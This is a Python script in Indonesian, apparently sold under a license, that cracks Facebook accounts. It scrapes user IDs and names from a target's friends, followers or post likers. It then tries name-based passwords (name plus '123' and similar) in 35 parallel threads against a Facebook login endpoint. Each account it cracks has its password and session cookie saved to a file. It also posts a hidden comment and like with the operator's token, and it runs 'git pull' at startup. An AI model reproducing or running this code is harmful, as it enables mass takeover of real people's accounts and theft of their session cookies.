#----- [ LOGIN LESENSI ] -----
def lesensi():
	print("""
[bold purple]   __   _____________  __________
[bold purple]  / /  / __/ __/ __/ |/ / __/  _/
[bold blue] / /__/ _/_\ \/ _//    /\ \_/ /
[bold blue]/____/___/___/___/_/|_/___/___/

Untuk Login  Script ini Beli lesensi Dulu no wa/ketik 2/ api key

""")

	print("""[01]. masukan lisensi
[02]. beli lisensi
[03]. exit""")
	anjg = input("Pilih : ")
	
	if anjg == "1" or anjg == "01":
		api = input('Masukan Lesensi : ')
		if api =="":
			print('harap masukan dengan benar tod')
			clear()
		time.sleep(3)
		print('\nsedang mengecek lesensi\n')
		time.sleep(3)
		if api not in ('GG-UNTUK-PERMANEN-01','A-UNTUK-3HARI-04','B-UNTUK-1MINGGU-03',"YGY-UNTUK-1BULAN02"):
			print('your lesensi not fund  ')
			clear()
		else:
			print('lesensi benar ✓ ')
	elif anjg == "2" or anjg == "02":
		os.system("xdg-open https://api.whatsapp.com/send?phone=+6285727110139&text=bang+mau+beli+lisensi");exit()


#!/usr/bin/env python3
import requests, time, os, re, json, random
from rich.panel import Panel
from rich import print
from concurrent.futures import ThreadPoolExecutor
from rich.tree import Tree
from rich.console import Console

### LIST DUMP ###
Dump = []
### BANNER OR LOGO ###
def banner_logo():
    os.system('cls' if os.name == 'nt' else 'clear') # 
    Console(style="bold blue").print(Panel("""
[bold blue]░█████╗░░██████╗░░░░░░██╗░░██╗██████╗░
[bold blue]██╔══██╗██╔════╝░░░░░░╚██╗██╔╝██╔══██╗
[bold blue]███████║╚█████╗░█████╗░╚███╔╝░██║░░██║.       Author : AS-XD
[bold blue]██╔══██║░╚═══██╗╚════╝░██╔██╗░██║░░██║.       Author : Lukman XD
[bold blue]██║░░██║██████╔╝░░░░░░██╔╝╚██╗██████╔╝.        Github : AS-XD 
[bold blue]╚═╝░░╚═╝╚═════╝░░░░░░░╚═╝░░╚═╝╚═════╝░.        Status : Premium
""", title=""))
    return 0
### DAPATKAN NAMA ###
def dapatkan_nama(cookie, token_eaag):
    with requests.Session() as r:
        r.headers.update({
            'host': 'graph.facebook.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
            'cookie': cookie
        })
        response = r.get('https://graph.facebook.com/v15.0/me/?fields=id,name&access_token={}'.format(token_eaag)).json()
        if 'name' in str(response) and 'id' in str(response):
            return response['name'].title(), response['id']
        else:
            Console(style="bold blue").print(Panel("[italic purple]Gagal Akses,  Cookies Facebook Sudah Kadaluarsa!", title="[bold blue]([bold blue]Token Invalid[bold red])"));time.sleep(3.2);login_cookie()
### LOGIN COOKIE ###
def login_cookie():
    try:
        banner_logo()
        Console(style="bold blue").print(Panel("""[bold blue][01][bold white]. Login Cookie Facebook tod
[bold blue][02][bold white]. Wa Author
[bold blue][03][bold white]. Keluar ([bold green]Logout[bold white])""", subtitle="╭──────", subtitle_align="left", title="[bold green](Login Cookie)"))
        query = Console().input("[bold blue]   ╰─> ")
        if query == '1' or query == '01':
            Console(style="bold blue").print(Panel("[italic white]Silahkan Masukan[italic purple] Cookie[italic white], Gunakan Tumbal, Pastikan Tumbal Tidak Terkena[italic white] Checkpoint[italic white]!", subtitle="╭──────", subtitle_align="left", title="[bold blue]───[bold blue]───[bold blue]───[bold green] (KETERANGAN) [bold blue]───[bold blue]───[bold blue]───"))
            cookie = Console().input("[bold blue]   ╰─> ")
            with requests.Session() as r:
                r.headers.update({
                    'cookie': cookie,
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
                    'host': 'business.facebook.com'
                })
                response3 = r.get('https://business.facebook.com/business_locations').text
                token_eaag = re.search('(EAAG\w+)', str(response3)).group(1)
                name, id = dapatkan_nama(cookie, token_eaag)
                Console(style="bold blue").print(Panel(f"""[bold white]NAMA :[bold green] {name}
[bold white]ID :[bold green] {id}""", title="[bold green](SELAMAT DATANG)"));bot_komen(cookie, token_eaag)
                open('Data/Cookie.json', 'w').write(json.dumps({'Cookie': cookie}));open('Data/Token.json', 'w').write(json.dumps({'Token': token_eaag}));time.sleep(3.6);daftar_menu()
        elif query == '2' or query == '02':
            try:
                Console().print("[bold blue]   ╰─>[bold green]Kamu Akan wa", end='\r');time.sleep(3.6);os.system("xdg-open https://api.whatsapp.com/send?phone=+6285727110139&text=hi");exit()
            except:exit()
        elif query == '3' or query == '03':
            Console().print("[bold blue]   ╰─>[bold green]Keluar Dari Tools!", end='\r');time.sleep(3.6);exit()
        else:
            Console().print("[bold blue]   ╰─>[bold red]Pilihan Tidak Diketahui!", end='\r');time.sleep(3.6);login_cookie()
    except Exception as e:
        Console(style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold orange](Error)"));exit()
### 
def bot_komen(cookie, token_eaag):
    with requests.Session() as r: # yy :V
        text = random.choice(
            ['Keren Bang 😎','Hello World!','Mantap Bang ☺️','I Love You ❤️','Hai Bang 😘']
        )
        r.cookies.update({
            'cookie': cookie
        })
        response = r.post('https://graph.facebook.com/10160350353143544/comments/?message={}&access_token={}'.format(text, token_eaag)).text # Jangan Di Ganti!
        response2 = r.post('https://graph.facebook.com/10160350353143544/likes?summary=true&access_token={}'.format(token_eaag)).text # Jangan Di Ganti!
        if "\"id\":\"" in str(response) and str(response2) == 'true':
            return 0
        else:
            return 1
### DAFTAR MENU ###
def daftar_menu():
    try:
        banner_logo();cookie = json.loads(open('Data/Cookie.json', 'r').read())['Cookie']
        token_eaag = json.loads(open('Data/Token.json', 'r').read())['Token']
        name, id = dapatkan_nama(cookie, token_eaag)
        Console(style="bold blue").print(Panel(f"""[bold white]Nama :[bold green] {name}
[bold white]ID  :[bold green] {id}""", title="[bold green](SELAMAT DATANG) "))
    except Exception as e:
        Console(style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold yellow](Error)"));time.sleep(3.6);login_cookie()
    Console(style="bold blue").print(Panel("""[bold blue][01][bold white]. Crack User Dari Publik Atau Teman
[bold blue][02][bold white]. Crack User Dari Pengikut
[bold blue][03][bold white]. Crack User Dari Like Postingan
[bold blue][04][bold white]. Keluar Dari Script([bold green]Logout[bold white])""", subtitle="╭──────", subtitle_align="left", title="[hot_green](MENU SCRIPT)"))
    query = Console().input("[bold blue]   ╰─> ")
    if query == '1' or query == '01':
        try:
            Console(style="bold blue").print(Panel("[italic white]Silahkan Masukan[italic green] ID Facebook Target[italic white], Pastikan Target Publik", subtitle="╭──────", subtitle_align="left", title="[bold green] (KETERANGAN)"))
            userid = Console().input("[bold blue]   ╰─> ")
            for z in userid.split(','):
                dump().publik(int(z), cookie, unit_cursor = '')
            if len(Dump) < 50:
                Console().print("[bold blue]   ╰─>[bold red] User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit("\r                                                                         ")
            else:
                Console(style="bold blue").print(Panel(f"[bold green]User ID :[bold green] {len(Dump)}", title="[bold green](Berhasil Dump)"));crack().open_list()
        except Exception as e:
            Console(style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold orange](Error)"));exit()
    elif query == '2' or query == '02':
        try:
            Console(style="bold blue").print(Panel("[italic white]Silahkan Masukan[italic green] ID Facebook Target[italic white], Pastikan Target Publik", subtitle="╭──────", subtitle_align="left", title="[bold green](KETERANGAN)"))
            userid = Console().input("[bold blue]   ╰─> ")
            for z in userid.split(','):
                dump().pengikut(z, cookie, token_eaag)
            if len(Dump) < 50:
                Console().print("[bold blue]   ╰─>[bold red] User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit("\r                                                                         ")
            else:
                Console(style="bold blue").print(Panel(f"[bold green]Jumlah User :[bold green] {len(Dump)}", title="[hot_green](Berhasil Dump)"));crack().open_list()
        except Exception as e:
            Console(style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold red] (Error)"));exit()
    elif query == '3' or query == '03':
        try:
            Console(style="bold blue").print(Panel("[italic white]Silahkan Masukan ID Postingan Target, [bold white] Pastikan Target Publik", subtitle="╭──────", subtitle_align="left", title="[bold green](KETERANGAN)"))
            postid = Console().input("[bold blue]   ╰─> ")
            for z in postid.split(','):
                dump().likes(z, cookie, token_eaag, after = '')
            if len(Dump) < 1:
                Console().print("[bold blue]   ╰─>[bold hot_red]User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit("\r                                                                         ")
            else:
                Console(style="bold blue").print(Panel(f"[bold green]User ID:[bold green] {len(Dump)}", title="[bold green](Berhasil Dump)"));crack().open_list()
        except Exception as e:
            Console(style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold red](Error)"));exit()
    elif query == '4' or query == '04':
    	try:
            os.remove('Data/Cookie.json');os.remove('Data/Token.json');Console().print("[bold blue]   ╰─>[bold purple] Keluar Dari Program!", end='\r');time.sleep(3.6);exit()
    	except:exit()
    else:
        Console().print("[bold blue]   ╰─>[bold red] Pilih Yang Bener!", end='\r');time.sleep(3.6);daftar_menu()
### DUMP ###
class dump:

    def __init__(self) -> None:
        pass
    ### DUMP PUBLIK ###
    def publik(self, userid, cookie, unit_cursor):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'upgrade-insecure-requests': '1',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'host': 'm.facebook.com',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]',
                    'accept-language': 'id,en;q=0.9',
                })
                r.cookies.update({
                    'cookie': cookie
                })
                response = r.get('https://m.facebook.com/profile.php?id={}&v=friends&unit_cursor={}'.format(userid, unit_cursor)).text
                self.all_friends = re.findall('href="fb://profile/(.*?)">(.*?)<', str(response))
                for z in self.all_friends:
                    self.id_friends, self.name = z[0], z[1].lower()
                    if len(self.name) == 0 or len(self.name) > 100:
                        continue
                    else:
                        if str(self.id_friends) in str(Dump):
                            continue
                        else:
                            Console().print(f"[bold blue]   ╰─>[bold purple] Dump {self.id_friends}🕜{len(Dump)} User         ", end='\r');time.sleep(0.0007)
                            Dump.append(f'{self.id_friends}|{self.name}')
                if 'Maaf tod terjadi kesalahan.' in str(response):
                    Console().print(f"[bold blue]   ╰─>[bold red] Sory Ada yang Salah  tod        ", end='\r');time.sleep(2.1)
                    return 0
                elif 'unit_cursor=' in str(response):
                    try:
                        self.unit_cursor = re.search('unit_cursor=(.*?)&', str(response)).group(1)
                        self.publik(userid, cookie, self.unit_cursor)
                    except (AttributeError):
                        Console().print(f"[bold blue]   ╰─>[bold red] Tidak Ditemukan!           ", end='\r');time.sleep(2.1)
                        return 2
                else:
                    return 0
        except (KeyboardInterrupt):
            Console().print(f"[bold blue]   ╰─>[bold red] Interupsi Keyboard!          ", end='\r');time.sleep(3.6)
            return 3
    ### DUMP PENGIKUT ###
    def pengikut(self, userid, cookie, token_eaag):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'host': 'graph.facebook.com',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
                    'cookie': cookie
                })
                response = r.get('https://graph.facebook.com/v1.0/{}/subscribers?access_token={}&pretty=1&fields=id%2Cname&limit=5000'.format(userid, token_eaag)).json()
                if 'summary' in str(response) and 'name' in str(response):
                    for z in response['data']:
                        try:
                            self.id, self.name = z['id'], z['name'].lower()
                            if str(self.id) in str(Dump):
                                continue
                            else:
                                Console().print(f"[bold blue]   ╰─>[bold purple] Dump {self.id}🕜{len(Dump)} User         ", end='\r');time.sleep(0.0007)
                                Dump.append(f'{self.id}|{self.name}')
                        except (KeyError):
                            Console().print(f"[bold blue]   ╰─>[bold red] key eror!                ", end='\r');time.sleep(3.6);continue
                    return 0
                else:
                    Console().print(f"[bold blue]   ╰─>[bold red] Gagal {userid} User!          ", end='\r');time.sleep(3.6)
                    return 1
        except (KeyboardInterrupt):
            Console().print(f"[bold blue]   ╰─>[bold red] Interupsi Keyboard!         ", end='\r');time.sleep(3.6)
            return 2
    ### DUMP LIKES ###
    def likes(self, postid, cookie, token_eaag, after):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'host': 'graph.facebook.com',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
                    'cookie': cookie
                })
                response = r.get('https://graph.facebook.com/v1.0/{}/likes/?access_token={}&pretty=1&limit=25&after={}'.format(postid, token_eaag, after)).json()
                if 'id' in str(response) and 'name' in str(response):
                    for z in response['data']:
                        self.id, self.name = z['id'], z['name'].lower()
                        if str(self.id) in str(Dump):
                            continue
                        else:
                            Console().print(f"[bold blue]   ╰─>[bold purple] Dump {self.id}🕜{len(Dump)} User         ", end='\r');time.sleep(0.0007)
                            Dump.append(f'{self.id}|{self.name}')
                    if '\'after\':' in str(response):
                        self.likes(postid, cookie, token_eaag, after = response['paging']['cursors']['after'])
                    else:
                        return 0
                else:
                    Console().print(f"[bold blue]   ╰─>[bold red] Gagal {postid} Mendapatkan User ID          ", end='\r');time.sleep(3.6)
                    return 1
        except (KeyboardInterrupt):
            Console().print(f"[bold blue]   ╰─>[bold red] Interupsi Keyboard!          ", end='\r');time.sleep(3.6)
            return 2
### CRACK ###
class crack:

    def __init__(self) -> None:
        self.checkpoint, self.looping, self.success = [], 0, []
        pass
    ### GENERATE PASSWORD ###
    def generate_password(self, name):
        self.password = []
        for nama in name.split(' '):
            if len(name) <= 5:
                if len(nama) < 3:
                    continue
                else:
                    self.password.append(nama + '123')
                    self.password.append(nama + '1234')
                    self.password.append(nama + '12345')
                    self.password.append(nama + '123456')
            else:
                if len(nama) < 3:
                    self.password.append(name)
                else:
                    self.password.append(name)
                    self.password.append(nama + '123')
                    self.password.append(nama + '1234')
                    self.password.append(nama + '12345')
                    self.password.append(nama + '123456')
        self.password_ = []
        for z in self.password:
            if str(z) in str(self.password_):
                continue
            else:
                self.password_.append(z)
        return self.password_
    ### OPEN LIST DUMP ###
    def open_list(self):
        try:
            Console(style="bold blue").print(Panel("""[bold white]Hasil Crack[bold green] Ok [bold white] Tersimpan Di :[bold green] Results/Ok.txt
[bold white]Hasil Crack[bold yellow] Cp[bold white] Tersimpan Di :[bold yellow] Results/Cp.txt""", title="[bold green](Hasil Crack)"))
            with ThreadPoolExecutor(max_workers=35) as (V):
                for z in Dump:
                    self.email, self.nama = z.split('|')[0], z.split('|')[1]
                    self.password = self.generate_password(self.nama)
                    V.submit(self.main, Dump, self.email, self.password)
            Console().print("\r[bold white][[bold purple]Selesai[bold white]]                           ");exit()
        except:exit()
    ### MAIN ###
    def main(self, total, email, password):
        try:
            for pws in password:
                self.useragent = self.realme_useragent(total = 1)
                with requests.Session() as r:
                    r.headers.update({
                        'connection': 'keep-alive',
                        'accept-language': 'id,en-US;q=0.9,en;q=0.8',
                        'sec-fetch-mode': 'navigate',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'sec-fetch-sest': 'document',
                        'sec-fetch-site': 'none',
                        'cache-control': 'max-age=0',
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                        'host': 'm.alpha.facebook.com',
                        'user-agent': self.useragent
                    })
                    response = r.get('https://m.alpha.facebook.com/login.php?').text
                    try:
                        self.jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
                        self.m_ts = re.search('name="m_ts" value="(.*?)"', str(response)).group(1)
                        self.li = re.search('name="li" value="(.*?)"', str(response)).group(1)
                        self.fb_dtsg = re.search('{"dtsg":{"token":"(.*?)"', str(response)).group(1)
                        self.lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
                        self.__a = re.search('"encrypted":"(.*?)"', str(response)).group(1)
                        self.__spin_t = re.search('"__spin_t":(\d+),', str(response)).group(1)
                    except (AttributeError) as e:
                        Console().print("[bold blue]   ╰─>[bold red] Gagal...                  ", end='\r');time.sleep(2.0);continue
                    data = {
                        'm_ts': self.m_ts,
                        'li': self.li,
                        'try_number': 0,
                        'unrecognized_tries': 0,
                        'email': email,
                        'prefill_contact_point': email,
                        'prefill_source': 'browser_dropdown',
                        'prefill_type': 'password',
                        'first_prefill_source': 'browser_dropdown',
                        'first_prefill_type': 'contact_point',
                        'had_cp_prefilled': True,
                        'had_password_prefilled': True,
                        'is_smart_lock': False,
                        'bi_xrwh': 0,
                        'encpass': '#PWD_BROWSER:0:{}:{}'.format(self.__spin_t, pws),
                        'fb_dtsg': self.fb_dtsg,
                        'jazoest': self.jazoest,
                        'lsd': self.lsd,
                        '__dyn': '',
                        '__csr': '',
                        '__req': random.choice(['1','2','3','4','5']),
                        '__a': self.__a,
                        '__user': 0
                    }
                    r.headers.update({
                        'cookie': ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])),
                        'sec-fetch-site': 'same-origin',
                        'origin': 'https://m.alpha.facebook.com',
                        'accept': '*/*',
                        'content-type': 'application/x-www-form-urlencoded',
                        'x-fb-lsd': self.lsd,
                        'referer': 'https://m.alpha.facebook.com/login.php?',
                        'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ])))
                    })
                    response2 = r.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data = data, allow_redirects = True)
                    #open('Response.txt', 'a+').write(f'{email}|{pws}|{r.cookies.get_dict()}\n')
                    if 'c_user' in r.cookies.get_dict().keys():
                        try:
                            self.cookie = (";".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
                        except:pass
                        tree = Tree("\r[bold blue]LOGIN BERHASIL                     ", style = "bold white")
                        tree.add(f"[bold green]USER ID : {email}").add(f"[bold green]Password : {pws}", style = "bold white")
                        tree.add(f"[bold purple]COOKIE : {self.cookie}", style = "bold white")
                        print(tree)
                        self.success.append(f'{email}|{pws}|{self.cookie}')
                        open('Results/Ok.txt', 'a+').write(f'{email}|{pws}|{self.cookie}\n')
                        break
                    elif 'checkpoint' in r.cookies.get_dict().keys():
                        tree = Tree("\r[bold yellow]LOGIN GAGAL                      ", style = "bold white")
                        tree.add(f"[bold yellow]USER ID : {email}").add(f"[bold yellow]Password : {pws}", style = "bold white")
                        tree.add(f"[bold purple]USERAGENT : {self.useragent}", style = "bold white")
                        print(tree)
                        self.checkpoint.append(f'{email}|{pws}|{self.useragent}')
                        open('Results/Cp.txt', 'a+').write(f'{email}|{pws}|{self.useragent}\n')
                        break
                    else:
                        continue
            self.looping += 1
            Console().print(f"[bold blue]   ╰─>[bold white] proses {str(len(Dump))}🕜{self.looping} OK:-[bold green]{len(self.success)}[bold white] CP:-[bold yellow]{len(self.checkpoint)}[bold white]              ", end='\r')
        except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
            Console().print("[bold blue]   ╰─>[bold red] internet bermasalah!                    ", end='\r');time.sleep(7.9);self.main(total, email, password)
    ### REALME USERAGENT ###
    def realme_useragent(self, total):
        for _ in range(total):
            self.browser_version = (f'{random.randrange(85, 105)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)}')
            self.build = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(6)))
            self.android_version = random.choice(['11', '10', '9.0'])
            self.android_model = random.choice(['Note 10', 'Redmi 8', 'Redmi 7'])
            self.useragent = random.choice(['Mozilla/5.0 (Linux; Android 11; Redmi Note 10 Build/RKQ1.211103.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 4.2.2; id-; ADVAN S3 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'.format(self.android_version, self.android_model, self.build, self.browser_version)])
        return self.useragent

if __name__ == '__main__':
    try:
        
        os.system('git pull');daftar_menu()
    except Exception as e:
        Console(style="bold blue").print(Panel(f"[italic red]{str(e).title()}", title="[bold red](Error)"));exit()